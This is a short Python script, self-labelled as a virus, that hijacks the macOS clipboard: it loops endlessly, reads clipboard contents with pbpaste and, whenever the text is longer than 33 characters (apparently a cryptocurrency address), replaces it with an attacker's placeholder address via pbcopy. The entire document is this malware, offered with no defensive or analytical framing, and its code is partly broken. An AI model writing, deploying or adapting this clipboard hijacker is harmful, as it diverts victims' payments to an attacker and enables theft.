import subprocess

#virus starts here
destination_address = "#ENTER ADDRESS HERE"

def get_clipboard():
    p = subprocess.Popen(['pbpaste'], stdout=subprocess.PIPE)
    data = str(p.stdout.read())
    if len(data) > 33:
        swap_address(data)

def swap_address(data):
    p = subprocess.Popen(['pbcopy'], stdin=subprocess.PIPE)
    p.stdin.write(destination_address)
    p.stdin.close()

while True:
    get_clipboard()

#virus ends here